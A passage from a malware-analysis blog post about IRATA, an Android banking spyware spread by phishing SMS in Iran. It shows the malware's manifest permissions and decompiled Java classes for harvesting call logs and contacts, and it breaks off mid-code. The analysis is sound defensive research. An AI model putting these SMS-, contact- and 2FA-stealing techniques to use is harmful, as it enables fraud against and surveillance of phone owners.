<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Technical analysis of IRATA android malware - muha2xmad</title>
<meta name="description" content="بسم الله الرحمن الرحيم  ">


  <meta name="author" content="Muhammad Hasan Ali">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="muha2xmad">
<meta property="og:title" content="Technical analysis of IRATA android malware">
<meta property="og:url" content="https://muha2xmad.github.io/malware-analysis/irata/">


  <meta property="og:description" content="بسم الله الرحمن الرحيم  ">



  <meta property="og:image" content="https://muha2xmad.github.io/assets/images/MA/irata/ira.jfif">





  <meta property="article:published_time" content="2022-08-26T00:00:00+00:00">





  

  


<link rel="canonical" href="https://muha2xmad.github.io/malware-analysis/irata/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Muhammad Hasan Ali",
      "url": "https://muha2xmad.github.io/"
    
  }
</script>


  <meta name="google-site-verification" content="yjK5jUGtGuvD9i_1SEaec8FrngezWj1KJqBbPuPRAQM" />





<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="muha2xmad Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site/lo.png">
<!-- <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site/lo.png"> -->
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site/lo.png" alt=""></a>
        
        <a class="site-title" href="/">
          muha2xmad
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Malware-analysis">Malware analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Mal-Document">Mal Documents</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site/ed.jpg" alt="Muhammad Hasan Ali" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Muhammad Hasan Ali</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Egypt</span>
        </li>
      

      
        
          
        
          
            <li><a href="https://twitter.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
        
          
            <li><a href="https://www.linkedin.com/in/muhammadhasanali/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Technical analysis of IRATA android malware">
    <meta itemprop="description" content="بسم الله الرحمن الرحيم">
    <meta itemprop="datePublished" content="2022-08-26T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Technical analysis of IRATA android malware
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  23 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#technical-review">Technical review</a></li>
  <li><a href="#static-analysis">Static analysis</a>
    <ul>
      <li><a href="#explore-androidmanifestxml">Explore AndroidManifest.xml</a></li>
      <li><a href="#dive-into-classesdex">Dive into classes.dex</a></li>
    </ul>
  </li>
  <li><a href="#dynamic-analysis">Dynamic analysis</a></li>
  <li><a href="#ioc">IoC</a></li>
  <li><a href="#article-quote">Article Quote</a></li>
  <li><a href="#ref">REF</a></li>
</ul>

            </nav>
          </aside>
        
        <p><strong>بسم الله الرحمن الرحيم</strong></p>

<p><strong>FreePalestine</strong></p>

<h1 id="introduction">Introduction</h1>

<p>In this blog, we will talk about IRATA. IRATA comes from a phishing attack to Iran. The victim receives a legitimate-looking SMS with a link to a phishing page that is impersonating government services, and lures them to download a malicious Android application and then pay a small fee for the service. The malicious application not only collects the victim’s credit card numbers, but also gains access to their 2FA authentication SMS, and turn the victim’s device into a bot capable of spreading similar phishing SMS to other potential victims.</p>

<h1 id="technical-review">Technical review</h1>

<ul>
  <li>
    <p>collect SMS: the malware collects victim’s SMS messages and then upload it to C2 server</p>
  </li>
  <li>
    <p>Bypass 2FA: After stealing credentials and SMS of the victim’s device which have the 2FA SMS to grantee the withdraw that the attacker did.</p>
  </li>
  <li>
    <p>Spam: The malware collects contacts to send phishing SMS to them.</p>
  </li>
  <li>
    <p>FCM: Using Firebase Cloud Messaging FCM as a C2 server to avoid detection.</p>
  </li>
</ul>

<h1 id="static-analysis">Static analysis</h1>

<h2 id="explore-androidmanifestxml">Explore AndroidManifest.xml</h2>

<p><code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> is not human-readable so we use <code class="language-plaintext highlighter-rouge">apktool</code> to decompile the apk first to be able to read the file and then open the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code>. We need to read this file to know the ability of this malicious APK and know more inforamation such as entry points for the app, Activities, Services, Intents, app permissions, and package name.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="p">&lt;</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"ir.shz.shzkisi.permission.C2D_MESSAGE"</span> <span class="n">android</span><span class="p">:</span><span class="n">protectionLevel</span><span class="p">=</span><span class="s">"signature"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.INTERNET"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_SMS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.VIBRATE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.RECEIVE_BOOT_COMPLETED"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.FOREGROUND_SERVICE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.WAKE_LOCK"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.ACCESS_NETWORK_STATE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"com.google.android.c2dm.permission.RECEIVE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"ir.shz.shzkisi.permission.C2D_MESSAGE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.SEND_SMS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.ACCESS_WIFI_STATE"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.RECEIVE_SMS"</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="n">uses</span><span class="p">-</span><span class="n">permission</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.permission.READ_CONTACTS"</span><span class="p">/&gt;</span>
</code></pre></div></div>

<p>As we see the malware has the ability to steal SMS, steal contacts, and know the state of the phone. This is the ability of a spyware which is gets your SMS and read your contacts to get more victims to send phishing SMS to.</p>

<p><code class="language-plaintext highlighter-rouge">com.google.android.c2dm.permission.RECEIVE</code> is to receive data form internet or cloud because the app uses Google Firebase to get commands from C2 server.</p>

<p><code class="language-plaintext highlighter-rouge">BIND_GET_INSTALL_REFERRER_SERVICE</code> is used by Firebase to recognize from where the app was installed.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="n">service</span> <span class="n">android</span><span class="p">:</span><span class="n">exported</span><span class="p">=</span><span class="s">"true"</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">".firebasemessaging"</span><span class="p">/&gt;</span>
        <span class="p">&lt;</span><span class="n">receiver</span> <span class="n">android</span><span class="p">:</span><span class="n">exported</span><span class="p">=</span><span class="s">"true"</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">".firebasemessaging$firebasemessaging_BR"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="n">action</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.intent.action.BOOT_COMPLETED"</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="n">action</span> <span class="n">android</span><span class="p">:</span><span class="n">name</span><span class="p">=</span><span class="s">"android.provider.Telephony.SMS_RECEIVED"</span><span class="p">/&gt;</span>
            <span class="p">&lt;/</span><span class="n">intent</span><span class="p">-</span><span class="n">filter</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="n">receiver</span><span class="p">&gt;</span>
</code></pre></div></div>
<p>When the app gets the peromissions related to SMS, The malware will collect the SMS from the victim’s phone and upload it to the C2 server.</p>

<h2 id="dive-into-classesdex">Dive into classes.dex</h2>

<p>We will unzip the APK file to get <code class="language-plaintext highlighter-rouge">classes.dex</code> file which has the compiled java code in dex form. We need to convert <code class="language-plaintext highlighter-rouge">classes.dex</code> file into <code class="language-plaintext highlighter-rouge">.jar</code> file using <code class="language-plaintext highlighter-rouge">d2j-dex2jar classes.dex</code> command then use <code class="language-plaintext highlighter-rouge">JD-GUI</code> or <code class="language-plaintext highlighter-rouge">JADX-GUI</code> which we will use. Or if you have <code class="language-plaintext highlighter-rouge">JEB</code> decompiler just drag and drop the <code class="language-plaintext highlighter-rouge">classes.dex</code> file.</p>

<p>After digging into the classes and methods, in <code class="language-plaintext highlighter-rouge">anywheresoftware</code> then <code class="language-plaintext highlighter-rouge">phone</code> we see some classes the malware will use to do its malicious activities.</p>
<p align="center">
  <img src="/assets/images/MA/irata/1.png" />
</p>
<center><font size="3"> <u>Figure</u>(1)  malicious activities<u></u> </font></center>
<p><br /></p>

<p>We see <code class="language-plaintext highlighter-rouge">CallLogWrapper</code> class which will be used to collect call logs of the victim and their details such as <code class="language-plaintext highlighter-rouge">date, type, duration, number, _id</code>. And then send it to the C2 server.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"CallLog"</span><span class="p">)</span>
<span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/CallLogWrapper.class */</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">CallLogWrapper</span> <span class="p">{</span>
    <span class="k">private</span> <span class="k">static</span> <span class="n">final</span> <span class="n">String</span><span class="p">[]</span> <span class="n">calls_projection</span> <span class="p">=</span> <span class="p">{</span><span class="s">"date"</span><span class="p">,</span> <span class="s">"type"</span><span class="p">,</span> <span class="s">"duration"</span><span class="p">,</span> <span class="s">"number"</span><span class="p">,</span> <span class="s">"_id"</span><span class="p">,</span> <span class="n">AppMeasurementSdk</span><span class="p">.</span><span class="n">ConditionalUserProperty</span><span class="p">.</span><span class="n">NAME</span><span class="p">};</span>

    <span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"CallItem"</span><span class="p">)</span>
    <span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/CallLogWrapper$CallItem.class */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">CallItem</span> <span class="p">{</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_INCOMING</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_MISSED</span> <span class="p">=</span> <span class="m">3</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">TYPE_OUTGOING</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">CachedName</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">CallType</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">long</span> <span class="n">Date</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">long</span> <span class="n">Duration</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">Id</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">Number</span><span class="p">;</span>

        <span class="k">public</span> <span class="nf">CallItem</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">=</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">CachedName</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nf">CallItem</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">long</span> <span class="n">j</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i2</span><span class="p">,</span> <span class="kt">long</span> <span class="n">j2</span><span class="p">,</span> <span class="n">String</span> <span class="n">str2</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">=</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">CachedName</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Number</span> <span class="p">=</span> <span class="n">str</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="s">""</span> <span class="p">:</span> <span class="n">str</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">=</span> <span class="n">i</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">CallType</span> <span class="p">=</span> <span class="n">i2</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Duration</span> <span class="p">=</span> <span class="n">j</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Date</span> <span class="p">=</span> <span class="n">j2</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">CachedName</span> <span class="p">=</span> <span class="n">str2</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="s">""</span> <span class="p">:</span> <span class="n">str2</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s">"Id="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">+</span> <span class="s">", Number="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Number</span> <span class="p">+</span> <span class="s">",CachedName="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">CachedName</span> <span class="p">+</span> <span class="s">", Type="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">CallType</span> <span class="p">+</span> <span class="s">", Date="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Date</span> <span class="p">+</span> <span class="s">", Duration="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Duration</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>But how we know that this class is even used, we try to know if this class is called from other classes using <code class="language-plaintext highlighter-rouge">find usage</code> in <code class="language-plaintext highlighter-rouge">jadx-gui</code>. just <code class="language-plaintext highlighter-rouge">right-clicking</code> on <code class="language-plaintext highlighter-rouge">CallLogWrapper</code> then <code class="language-plaintext highlighter-rouge">find usage(x)</code>. We see it’s not used by any classes.</p>
<p align="center">
  <img src="/assets/images/MA/irata/2.png" />
</p>
<center><font size="3"> <u>Figure</u>(2)  `CallLogWrapper` is not used <u></u> </font></center>
<p><br /></p>

<p>Then we go to <code class="language-plaintext highlighter-rouge">ContactsWrapper</code> which will collect the victim’s contacts and their details such as <code class="language-plaintext highlighter-rouge">times_contacted, number, last_time_contacted, display_name</code>. And the malware will collect the emails connected to the contact such as  <code class="language-plaintext highlighter-rouge">EMAIL_HOME</code> and <code class="language-plaintext highlighter-rouge">EMAIL_CUSTOM</code> and others. And even collects the photos of the contacts if it’s found.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"Contacts"</span><span class="p">)</span>
<span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/ContactsWrapper.class */</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">ContactsWrapper</span> <span class="p">{</span>
    <span class="k">private</span> <span class="k">static</span> <span class="n">final</span> <span class="n">String</span><span class="p">[]</span> <span class="n">people_projection</span> <span class="p">=</span> <span class="p">{</span><span class="s">"times_contacted"</span><span class="p">,</span> <span class="s">"number"</span><span class="p">,</span> <span class="s">"last_time_contacted"</span><span class="p">,</span> <span class="s">"display_name"</span><span class="p">,</span> <span class="n">AppMeasurementSdk</span><span class="p">.</span><span class="n">ConditionalUserProperty</span><span class="p">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s">"notes"</span><span class="p">,</span> <span class="s">"starred"</span><span class="p">,</span> <span class="s">"_id"</span><span class="p">};</span>

    <span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"Contact"</span><span class="p">)</span>
    <span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/ContactsWrapper$Contact.class */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">Contact</span> <span class="p">{</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">EMAIL_CUSTOM</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">EMAIL_HOME</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">EMAIL_MOBILE</span> <span class="p">=</span> <span class="m">4</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">EMAIL_OTHER</span> <span class="p">=</span> <span class="m">3</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">EMAIL_WORK</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">PHONE_CUSTOM</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">PHONE_FAX_HOME</span> <span class="p">=</span> <span class="m">5</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">PHONE_FAX_WORK</span> <span class="p">=</span> <span class="m">4</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">PHONE_HOME</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">PHONE_MOBILE</span> <span class="p">=</span> <span class="m">2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">PHONE_OTHER</span> <span class="p">=</span> <span class="m">7</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">PHONE_PAGER</span> <span class="p">=</span> <span class="m">6</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">final</span> <span class="kt">int</span> <span class="n">PHONE_WORK</span> <span class="p">=</span> <span class="m">3</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">DisplayName</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">Id</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">long</span> <span class="n">LastTimeContacted</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">Name</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">Notes</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">PhoneNumber</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">boolean</span> <span class="n">Starred</span><span class="p">;</span>
        <span class="k">public</span> <span class="kt">int</span> <span class="n">TimesContacted</span><span class="p">;</span>

        <span class="k">public</span> <span class="nf">Contact</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">PhoneNumber</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">=</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="cm">/* JADX INFO: Access modifiers changed from: package-private */</span>
        <span class="k">public</span> <span class="nf">Contact</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">String</span> <span class="n">str2</span><span class="p">,</span> <span class="n">boolean</span> <span class="n">z</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">String</span> <span class="n">str3</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i2</span><span class="p">,</span> <span class="kt">long</span> <span class="n">j</span><span class="p">,</span> <span class="n">String</span> <span class="n">str4</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">PhoneNumber</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">=</span> <span class="p">-</span><span class="m">1</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">DisplayName</span> <span class="p">=</span> <span class="n">str</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="s">""</span> <span class="p">:</span> <span class="n">str</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">PhoneNumber</span> <span class="p">=</span> <span class="n">str2</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="s">""</span> <span class="p">:</span> <span class="n">str2</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Starred</span> <span class="p">=</span> <span class="n">z</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">=</span> <span class="n">i</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Notes</span> <span class="p">=</span> <span class="n">str3</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="s">""</span> <span class="p">:</span> <span class="n">str3</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">TimesContacted</span> <span class="p">=</span> <span class="n">i2</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">LastTimeContacted</span> <span class="p">=</span> <span class="n">j</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Name</span> <span class="p">=</span> <span class="n">str4</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="s">""</span> <span class="p">:</span> <span class="n">str4</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="n">Map</span> <span class="nf">GetEmails</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">!=</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span> <span class="p">{</span>
